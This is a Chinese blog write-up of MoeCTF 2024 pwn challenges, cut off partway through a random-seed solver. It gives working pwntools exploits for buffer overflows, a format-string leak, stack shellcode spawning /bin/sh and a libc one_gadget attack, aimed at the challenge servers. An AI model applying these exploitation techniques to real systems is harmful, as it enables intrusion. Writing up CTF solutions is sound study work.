@@ -1,0 +1,776 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>2024-MOECTF-Pwn | 晚栀wingee~</title>
+
+  <!-- keywords -->
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="引言： 2024年MoeCTF-Pwn方向复健......">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2024-MOECTF-Pwn">
+<meta property="og:url" content="http://47.96.29.144/2024/09/28/MOECTF/index.html">
+<meta property="og:site_name" content="晚栀wingee~">
+<meta property="og:description" content="引言： 2024年MoeCTF-Pwn方向复健......">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://47.96.29.144/2024/09/28/MOECTF/image-20240928085421636.png">
+<meta property="og:image" content="http://47.96.29.144/2024/09/28/MOECTF/image-20240928085840661.png">
+<meta property="og:image" content="http://47.96.29.144/2024/09/28/MOECTF/image-20240928090141159.png">
+<meta property="og:image" content="http://47.96.29.144/2024/09/28/MOECTF/image-20240928090520128.png">
+<meta property="og:image" content="http://47.96.29.144/2024/09/28/MOECTF/image-20240928090632351.png">
+<meta property="og:image" content="http://47.96.29.144/2024/09/28/MOECTF/image-20240928091252433.png">
+<meta property="og:image" content="http://47.96.29.144/2024/09/28/MOECTF/image-20240928091645769.png">
+<meta property="og:image" content="http://47.96.29.144/2024/09/28/MOECTF/image-20240928091932181.png">
+<meta property="og:image" content="http://47.96.29.144/2024/09/28/MOECTF/image-20240928092905703.png">
+<meta property="og:image" content="http://47.96.29.144/2024/09/28/MOECTF/image-20240928092930808.png">
+<meta property="og:image" content="http://47.96.29.144/2024/09/28/MOECTF/image-20240928093002068.png">
+<meta property="og:image" content="http://47.96.29.144/2024/09/28/MOECTF/image-20241007003445301.png">
+<meta property="og:image" content="http://47.96.29.144/2024/09/28/MOECTF/image-20241007003635180.png">
+<meta property="og:image" content="http://47.96.29.144/2024/09/28/MOECTF/image-20241007003859135.png">
+<meta property="og:image" content="http://47.96.29.144/2024/09/28/MOECTF/image-20241007004807834.png">
+<meta property="og:image" content="http://47.96.29.144/2024/09/28/MOECTF/image-20240928093352506.png">
+<meta property="og:image" content="http://47.96.29.144/2024/09/28/MOECTF/image-20240929164849567.png">
+<meta property="og:image" content="http://47.96.29.144/2024/09/28/MOECTF/image-20240928094101502.png">
+<meta property="og:image" content="http://47.96.29.144/2024/09/28/MOECTF/image-20240928094434492.png">
+<meta property="og:image" content="http://47.96.29.144/2024/09/28/MOECTF/image-20240928094707280.png">
+<meta property="og:image" content="http://47.96.29.144/2024/09/28/MOECTF/image-20240928095010941.png">
+<meta property="og:image" content="http://47.96.29.144/2024/09/28/MOECTF/image-20240928095122351.png">
+<meta property="og:image" content="http://47.96.29.144/2024/09/28/MOECTF/image-20240928100055987.png">
+<meta property="og:image" content="http://47.96.29.144/2024/09/28/MOECTF/image-20240928100107938.png">
+<meta property="og:image" content="http://47.96.29.144/2024/09/28/MOECTF/image-20240928100218900.png">
+<meta property="og:image" content="http://47.96.29.144/2024/09/28/MOECTF/image-20240928100228931.png">
+<meta property="og:image" content="http://47.96.29.144/2024/09/28/MOECTF/image-20240928100719678.png">
+<meta property="og:image" content="http://47.96.29.144/2024/09/28/MOECTF/image-20240928100809458.png">
+<meta property="og:image" content="http://47.96.29.144/2024/09/28/MOECTF/image-20240928101021218.png">
+<meta property="og:image" content="http://47.96.29.144/2024/09/28/MOECTF/image-20240928101758436.png">
+<meta property="og:image" content="http://47.96.29.144/2024/09/28/MOECTF/image-20240928102226759.png">
+<meta property="og:image" content="http://47.96.29.144/2024/09/28/MOECTF/image-20240928102936063.png">
+<meta property="og:image" content="http://47.96.29.144/2024/09/28/MOECTF/image-20240928103150567.png">
+<meta property="og:image" content="http://47.96.29.144/2024/09/28/MOECTF/image-20240929145456509.png">
+<meta property="og:image" content="http://47.96.29.144/2024/09/28/MOECTF/image-20240928104128587.png">
+<meta property="og:image" content="http://47.96.29.144/2024/09/28/MOECTF/image-20240928104218408.png">
+<meta property="og:image" content="http://47.96.29.144/2024/09/28/MOECTF/image-20240928105113719.png">
+<meta property="og:image" content="http://47.96.29.144/2024/09/28/MOECTF/image-20240928105059505.png">
+<meta property="og:image" content="http://47.96.29.144/2024/09/28/MOECTF/image-20240928122140694.png">
+<meta property="og:image" content="http://47.96.29.144/2024/09/28/MOECTF/image-20240928122419658.png">
+<meta property="og:image" content="http://47.96.29.144/2024/09/28/MOECTF/image-20240928122456552.png">
+<meta property="og:image" content="http://47.96.29.144/2024/09/28/MOECTF/image-20240928122523083.png">
+<meta property="article:published_time" content="2024-09-28T00:48:59.000Z">
+<meta property="article:modified_time" content="2024-10-06T16:54:31.722Z">
+<meta property="article:tag" content="Pwn">
+<meta property="article:tag" content="MoeCTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://47.96.29.144/2024/09/28/MOECTF/image-20240928085421636.png">
+  
+    <link rel="alternative" href="/atom.xml" title="晚栀wingee~" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/img/avatar.jpg">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  
+
+  
+<script src="//cdn.bootcss.com/require.js/2.3.2/require.min.js"></script>
+
+  
+<script src="//cdn.bootcss.com/jquery/3.1.1/jquery.min.js"></script>
+
+
+  
+<meta name="generator" content="Hexo 7.0.0"><style>mjx-container[jax="SVG"] {
+  direction: ltr;
+}
+
+mjx-container[jax="SVG"] > svg {
+  overflow: visible;
+}
+
+mjx-container[jax="SVG"][display="true"] {
+  display: block;
+  text-align: center;
+  margin: 1em 0;
+}
+
+mjx-container[jax="SVG"][justify="left"] {
+  text-align: left;
+}
+
+mjx-container[jax="SVG"][justify="right"] {
+  text-align: right;
+}
+
+g[data-mml-node="merror"] > g {
+  fill: red;
+  stroke: red;
+}
+
+g[data-mml-node="merror"] > rect[data-background] {
+  fill: yellow;
+  stroke: none;
+}
+
+g[data-mml-node="mtable"] > line[data-line] {
+  stroke-width: 70px;
+  fill: none;
+}
+
+g[data-mml-node="mtable"] > rect[data-frame] {
+  stroke-width: 70px;
+  fill: none;
+}
+
+g[data-mml-node="mtable"] > .mjx-dashed {
+  stroke-dasharray: 140;
+}
+
+g[data-mml-node="mtable"] > .mjx-dotted {
+  stroke-linecap: round;
+  stroke-dasharray: 0,140;
+}
+
+g[data-mml-node="mtable"] > svg {
+  overflow: visible;
+}
+
+[jax="SVG"] mjx-tool {
+  display: inline-block;
+  position: relative;
+  width: 0;
+  height: 0;
+}
+
+[jax="SVG"] mjx-tool > mjx-tip {
+  position: absolute;
+  top: 0;
+  left: 0;
+}
+
+mjx-tool > mjx-tip {
+  display: inline-block;
+  padding: .2em;
+  border: 1px solid #888;
+  font-size: 70%;
+  background-color: #F8F8F8;
+  color: black;
+  box-shadow: 2px 2px 5px #AAAAAA;
+}
+
+g[data-mml-node="maction"][data-toggle] {
+  cursor: pointer;
+}
+
+mjx-status {
+  display: block;
+  position: fixed;
+  left: 1em;
+  bottom: 1em;
+  min-width: 25%;
+  padding: .2em .4em;
+  border: 1px solid #888;
+  font-size: 90%;
+  background-color: #F8F8F8;
+  color: black;
+}
+
+foreignObject[data-mjx-xml] {
+  font-family: initial;
+  line-height: normal;
+  overflow: visible;
+}
+
+.MathJax path {
+  stroke-width: 3;
+}
+
+mjx-container[display="true"] {
+  overflow: auto hidden;
+}
+
+mjx-container[display="true"] + br {
+  display: none;
+}
+</style></head>
+<body>
+  <div id="container">
+    <div id="particles-js"></div>
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+	<header id="header" class="inner">
+		<a href="/" class="profilepic">
+			
+				<img lazy-src="/img/avatar.jpg" class="js-avatar">
+			
+		</a>
+
+		<hgroup>
+			<h1 class="header-author"><a href="/"></a></h1>
+		</hgroup>
+
+		
+
+		<div class="switch-area">
+			<div class="switch-wrap">
+				<section class="switch-part switch-part1">
+					<nav class="header-menu">
+						<ul>
+						
+							<li><a href="/poetry/poeting">Home</a></li>
+				        
+							<li><a href="/archives">Archives</a></li>
+				        
+							<li><a href="/tags">Tags</a></li>
+				        
+							<li><a href="/introduction">About me</a></li>
+				        
+							<li><a href="/poetry">Winegee的书房</a></li>
+				        
+							<li><a href="/log">Maintenance log</a></li>
+				        
+						</ul>
+					</nav>
+					<nav class="half-header-menu">
+						<a class="hide">Home</a>
+						<a>Tags</a>
+						<a>Links</a>
+						<a>About</a>
+					</nav>
+					<nav class="header-nav">
+						<div class="social">
+							
+								<a class="github" target="_blank" href="https://github.com/wing3e" title="github">github</a>
+					        
+								<a class="weibo" target="_blank" href="#" title="weibo">weibo</a>
+					        
+						</div>
+						<!-- music -->
+						
+							<!-- <div style="position: absolute; bottom: 120px; left: auto; width: 85%;"> -->
+							<div style="position: absolute; left: auto; width: 85%;">
+								<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=220 height=86 src="//music.163.com/outchain/player?type=2&id=1805347343&auto=1&height=66"></iframe>
+							</div>
+						
+					</nav>
+				</section>
+				
+				
+				<section class="switch-part switch-part2">
+					<div class="widget tagcloud" id="js-tagcloud">
+						<a href="/tags/BeginCTF/" style="font-size: 12px;">BeginCTF</a> <a href="/tags/CAN-IDS/" style="font-size: 12px;">CAN-IDS</a> <a href="/tags/MoeCTF/" style="font-size: 12px;">MoeCTF</a> <a href="/tags/P/" style="font-size: 10px;">P</a> <a href="/tags/Pwn/" style="font-size: 18px;">Pwn</a> <a href="/tags/Reverse/" style="font-size: 14px;">Reverse</a> <a href="/tags/ZJUCTF/" style="font-size: 14px;">ZJUCTF</a> <a href="/tags/pwn/" style="font-size: 12px;">pwn</a> <a href="/tags/%E4%BF%A1%E6%81%AF%E7%90%86%E8%AE%BA/" style="font-size: 12px;">信息理论</a> <a href="/tags/%E5%A0%86%E5%88%A9%E7%94%A8/" style="font-size: 14px;">堆利用</a> <a href="/tags/%E5%AE%89%E6%B4%B5%E6%9D%AF/" style="font-size: 12px;">安洵杯</a> <a href="/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/" style="font-size: 12px;">密码学</a> <a href="/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/" style="font-size: 16px;">操作系统</a> <a href="/tags/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1/" style="font-size: 18px;">数学建模</a> <a href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/" style="font-size: 14px;">计算机体系结构</a> <a href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9FII/" style="font-size: 20px;">计算机系统II</a> <a href="/tags/%E8%BD%A6%E8%81%94%E7%BD%91/" style="font-size: 12px;">车联网</a>
+					</div>
+				</section>
+				
+				
+				
+				<section class="switch-part switch-part3">
+					<div id="js-friends">
+					
+			          <a target="_blank" class="main-nav-link switch-friends-link" href="https://note.jiepeng.tech/">JPGG&#39;s NoteBook</a>
+			        
+			          <a target="_blank" class="main-nav-link switch-friends-link" href="http://47.99.33.238/">Tauhkc&#39;s Note</a>
+			        
+			          <a target="_blank" class="main-nav-link switch-friends-link" href="https://xymmsnotebook.gitbook.io/noteofxymm/">xy猫猫</a>
+			        
+			          <a target="_blank" class="main-nav-link switch-friends-link" href="https://zjuccnocc.github.io/Home">CCnocc</a>
+			        
+			          <a target="_blank" class="main-nav-link switch-friends-link" href="https://hzeroyuke.github.io/my_blog/">华零的Notebook</a>
+			        
+			          <a target="_blank" class="main-nav-link switch-friends-link" href="http://miraclemaster.cn/">恩浩gg</a>
+			        
+			          <a target="_blank" class="main-nav-link switch-friends-link" href="http://116.62.208.33/">SLXjj没想好标题</a>
+			        
+			          <a target="_blank" class="main-nav-link switch-friends-link" href="https://zjulwind.github.io/home/">ZY老师</a>
+			        
+			        </div>
+				</section>
+				
+
+				
+				
+				<section class="switch-part switch-part4">
+				
+					<div id="js-aboutme">aaa</div>
+				</section>
+				
+			</div>
+		</div>
+	</header>				
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+  	<div class="overlay">
+  		<div class="slider-trigger"></div>
+  		<h1 class="header-author js-mobile-header hide"></h1>
+  	</div>
+	<div class="intrude-less">
+		<header id="header" class="inner">
+			<div class="profilepic">
+				<img lazy-src="/img/avatar.jpg" class="js-avatar">
+			</div>
+			<hgroup>
+			  <h1 class="header-author"></h1>
+			</hgroup>
+			
+			<nav class="header-menu">
+				<ul>
+				
+					<li><a href="/poetry/poeting">Home</a></li>
+		        
+					<li><a href="/archives">Archives</a></li>
+		        
+					<li><a href="/tags">Tags</a></li>
+		        
+					<li><a href="/introduction">About me</a></li>
+		        
+					<li><a href="/poetry">Winegee的书房</a></li>
+		        
+					<li><a href="/log">Maintenance log</a></li>
+		        
+		        <div class="clearfix"></div>
+				</ul>
+			</nav>
+			<nav class="header-nav">
+				<div class="social">
+					
+						<a class="github" target="_blank" href="https://github.com/wing3e" title="github">github</a>
+			        
+						<a class="weibo" target="_blank" href="#" title="weibo">weibo</a>
+			        
+				</div>
+			</nav>
+		</header>				
+	</div>
+</nav>
+      <div class="body-wrap"><article id="post-MOECTF" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2024/09/28/MOECTF/" class="article-date">
+  	<time datetime="2024-09-28T00:48:59.000Z" itemprop="datePublished">2024-09-28</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      2024-MOECTF-Pwn
+      
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+	<div class="article-tag tagcloud">
+		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/MoeCTF/" rel="tag">MoeCTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Pwn/" rel="tag">Pwn</a></li></ul>
+	</div>
+
+        
+
+        
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <script type="text/javascript" src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+<h3 id="引言">引言：</h3>
+<p>2024年MoeCTF-Pwn方向复健......</p>
+<span id="more"></span>
+<h3 id="not-enough-time">2 Not Enough Time</h3>
+<p>很基础的pwntools使用，链接远程服务是计算算式。</p>
+<p><img src="/2024/09/28/MOECTF/image-20240928085421636.png"></p>
+<p>只要接受远程的算式然后算出来再发回去就好了，需要注意的就是有的算式可能是小数，正数的小数要向下取整，负数也需要向下取整，即<code>-3.6</code>需要发送<code>-4</code></p>
+<p>exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> wstube <span class="keyword">import</span> websocket</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line"><span class="comment"># context(arch = "amd64", log_level = "debug")</span></span><br><span class="line"></span><br><span class="line">p = websocket(<span class="string">"wss://ctf.xidian.edu.cn/api/traffic/yPC0muu0Vi9OKlVsJTQPl?port=9999"</span>)</span><br><span class="line"></span><br><span class="line">p.recvline()</span><br><span class="line">p.recvline()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">    to_do = p.recvuntil(<span class="string">b"="</span>)[:-<span class="number">1</span>]</span><br><span class="line">    payload = <span class="built_in">str</span>(<span class="built_in">round</span>(<span class="built_in">eval</span>(to_do.decode())))</span><br><span class="line">    p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.recvline()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">    to_do = p.recvuntil(<span class="string">b"="</span>)[:-<span class="number">1</span>].replace(<span class="string">b"\n"</span>, <span class="string">b""</span>)</span><br><span class="line">    log.info(to_do)</span><br><span class="line"></span><br><span class="line">    payload_float = <span class="built_in">eval</span>(to_do.decode())</span><br><span class="line">    payload = <span class="built_in">str</span>(math.floor(<span class="built_in">eval</span>(to_do.decode())))</span><br><span class="line"></span><br><span class="line">    log.info(payload)</span><br><span class="line">    log.info(payload_float)</span><br><span class="line"></span><br><span class="line">    p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>flag: <code>moectf{4RltHM3TlC_Is_nOt-MaTH3matICS16b02bc}</code></p>
+<h3 id="no_more_gets">3 no_more_gets</h3>
+<p>IDA查看有一个后门函数，没开PIE，有gets溢出点。</p>
+<p><img src="/2024/09/28/MOECTF/image-20240928085840661.png"></p>
+<p>常规ret2test，exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> wstube <span class="keyword">import</span> websocket</span><br><span class="line"></span><br><span class="line">p = websocket(<span class="string">"wss://ctf.xidian.edu.cn/api/traffic/ONk1pErygtYAgk3qf4Nkt?port=9999"</span>)</span><br><span class="line"><span class="comment"># p = process("./lockedshell")</span></span><br><span class="line">elf = ELF(<span class="string">"./lockedshell"</span>)</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">"amd64"</span></span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">pause()</span><br><span class="line">p.sendline(<span class="string">b"A"</span> * <span class="number">88</span> + p64(<span class="number">0x401193</span>) + p64(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>flag: <code>moectf{GeTs_5tR1Ng-thUS_g3T5-FI4G48f2e97f}</code></p>
+<h3 id="leak_sth">4 leak_sth</h3>
+<p>IDA查看有一个后门函数，开了PIE，有一个格式化字符串漏洞。</p>
+<p>代码大意是输入一个数，如果和一个生成的随机数相等，则可以getshell</p>
+<p><img src="/2024/09/28/MOECTF/image-20240928090141159.png"></p>
+<p>常规的fmt，先利用printf泄露栈上的v3，再输入和v3相等的数字即可getshell</p>
+<p>exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> wstube <span class="keyword">import</span> websocket</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">"amd64"</span></span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line">p = websocket(<span class="string">"wss://ctf.xidian.edu.cn/api/traffic/i48poa7ytE8JnFGAZdwgf?port=9999"</span>)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">7</span></span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">payload = (<span class="string">"%{}$p"</span>.<span class="built_in">format</span>(offset)).encode()</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvline()</span><br><span class="line">result = <span class="built_in">eval</span>(p.recvline())</span><br><span class="line">p.info(<span class="built_in">hex</span>(result))</span><br><span class="line">p.sendline(<span class="built_in">str</span>(result))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>flag: <code>moectf{yOu_4r3_1uky-oR-Clev3Rcfe1dae2}</code></p>
+<h3 id="ez_shellcode">5 ez_shellcode</h3>
+<p>checksec查看文件，发现栈可执行。</p>
+<p><img src="/2024/09/28/MOECTF/image-20240928090520128.png"></p>
+<p>IDA查看，给了一个栈上的地址和一个可以任意操控长度的可输入字符串。</p>
+<p><img src="/2024/09/28/MOECTF/image-20240928090632351.png"></p>
+<p>那就直接溢出把shellcode布在栈上好了。</p>
+<p>exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> wstube <span class="keyword">import</span> websocket</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">"amd64"</span></span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line">p = websocket(<span class="string">"wss://ctf.xidian.edu.cn/api/traffic/SmGD2PtDACoAeKYmSSKLH?port=9999"</span>)</span><br><span class="line"></span><br><span class="line">size = <span class="number">0x4000</span></span><br><span class="line">p.sendlineafter(<span class="string">b"Tell me your age:"</span>, <span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line">p.recvline()</span><br><span class="line">p.recvline()</span><br><span class="line">stack_addr = <span class="built_in">eval</span>(p.recvline().decode())</span><br><span class="line">p.info(<span class="built_in">hex</span>(stack_addr))</span><br><span class="line">payload = (<span class="string">b"A"</span> * (<span class="number">0x60</span> + <span class="number">8</span>) + p64(stack_addr + <span class="number">0x100</span>)).ljust(<span class="number">0x100</span>, <span class="string">b"\x00"</span>)</span><br><span class="line">payload += asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">p.recvline()</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>flag: <code>moectf{WelI-d0Ne_My_fRieND5a568c95e0}</code></p>
+<h3 id="这是什么libc">6 这是什么？libc！</h3>
+<p>IDA查看，可泄露一个libc的函数地址，也就可以算出libc基址，然后常规pop，bin_sh，system就可以 / one_gadget</p>
+<p><img src="/2024/09/28/MOECTF/image-20240928091252433.png"></p>
+<p>exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> wstube <span class="keyword">import</span> websocket</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">"amd64"</span></span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line">p = websocket(<span class="string">"wss://ctf.xidian.edu.cn/api/traffic/l311TgUz2znHEZyLjh62s?port=9999"</span>)</span><br><span class="line"><span class="comment"># p = process("./prelibc")</span></span><br><span class="line">libc = ELF(<span class="string">"./libc.so.6"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b"PIE enabled, but no worry.\nI give you an address in libc: "</span>)</span><br><span class="line">libc_base = <span class="built_in">eval</span>(p.recv(<span class="number">14</span>).decode()) - libc.sym[<span class="string">"puts"</span>]</span><br><span class="line">p.info(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">pop_rdi = libc_base + libc.search(asm(<span class="string">"pop rdi; ret;"</span>)).__next__()</span><br><span class="line">bin_sh = libc_base + libc.search(<span class="string">b"/bin/sh"</span>).__next__()</span><br><span class="line">system = libc_base + libc.sym[<span class="string">"system"</span>]</span><br><span class="line"></span><br><span class="line">one_gadget = [<span class="number">0x50a47</span>, <span class="number">0xebc81</span>, <span class="number">0xebc85</span>, <span class="number">0xebc88</span>]</span><br><span class="line"><span class="comment">#  [17] .rodata           PROGBITS         00000000001bd000  001bd000</span></span><br><span class="line">p.recv()</span><br><span class="line">payload = <span class="string">b"A"</span> + p64(libc_base + <span class="number">0x1bd000</span> + <span class="number">0x78</span>) + p64(libc_base + one_gadget[<span class="number">0</span>])</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>需要注意的是要把rbp控到一个最好附近都是可读可写的地方，这样不管压栈还是弹栈，内部函数的地址读写都不会出现问题。</p>
+<p>flag: <code>moectf{5o-mucH_ExpIoiTable-ln-ll6C1d5c87f}</code></p>
+<h3 id="这是什么shellcode">7 这是什么？shellcode！</h3>
+<p>这题IDA F5会出点问题，没关系直接看汇编就行</p>
+<p><img src="/2024/09/28/MOECTF/image-20240928091645769.png"></p>
+<p>常规shellcode，连检查都没有</p>
+<p>exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> wstube <span class="keyword">import</span> websocket</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">"amd64"</span></span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line">p = websocket(<span class="string">"wss://ctf.xidian.edu.cn/api/traffic/H1DEjtScGhOqZfZ9DTkWO?port=9999"</span>)</span><br><span class="line"><span class="comment"># p = process("./prelibc")</span></span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">payload = asm(shellcraft.sh())</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>flag: <code>moectf{GetSh31L-NEvER-5o_e45Y3070a658b}</code></p>
+<h3 id="这是什么random">8 这是什么？random！</h3>
+<p>IDA查看程序，看起来是一个随机数预测，上面框起来的部分用timer的day作为种子，所以很好预测，可以绕过。</p>
+<p>后面的预测部分可以不管，因为输错了也不会exit，之后就可以很丝滑的输出flag了。</p>
+<p><img src="/2024/09/28/MOECTF/image-20240928091932181.png"></p>
+<p>所以我们需要解决的就是上面的0xa次预测</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> {</span><br><span class="line">    <span class="type">time_t</span> timer = time(<span class="number">0</span>);          </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tm</span> *<span class="title">v3</span> =</span> localtime(&amp;timer); </span><br><span class="line">    srandom(v3-&gt;tm_yday);             </span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span> ; i &lt; <span class="number">0xa</span> ; i++){</span><br><span class="line">        